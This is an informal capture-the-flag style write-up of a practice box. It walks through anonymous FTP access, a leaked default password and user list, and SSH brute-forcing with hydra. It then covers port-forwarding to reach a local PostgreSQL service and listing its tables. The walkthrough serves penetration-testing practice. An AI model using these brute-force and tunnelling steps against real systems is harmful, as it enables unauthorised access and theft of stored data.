this box shows an ftp with aonomous login

ftp anonymous@{boxip}
login in we have accees to a folder with 2 filess with 

in the first file the default password: funnel123#!#
in the second some potential users:
- root
- optimus
- christine
- albert
- andreas
- maria

using these we can use "hydra" to bruteforce the ssh login

hydra -L users -P pass {boxip} ssh

then we can login in with christine:funnel123#!#

with this we can see local ports using: ss -tln
wiht this we can see the service name: ss -tla

we cant directly connect to it
but we can remote the local port:
ssh -L 1234:localhost:5432 christine@{boxip}

then we can access the service in the local port
and connect to the postgres with:
psql -U christine -h localhost -p 1234
\l #list databases
\c {name} #connect to a database
\dt #list tables
select * from {table} #show table content
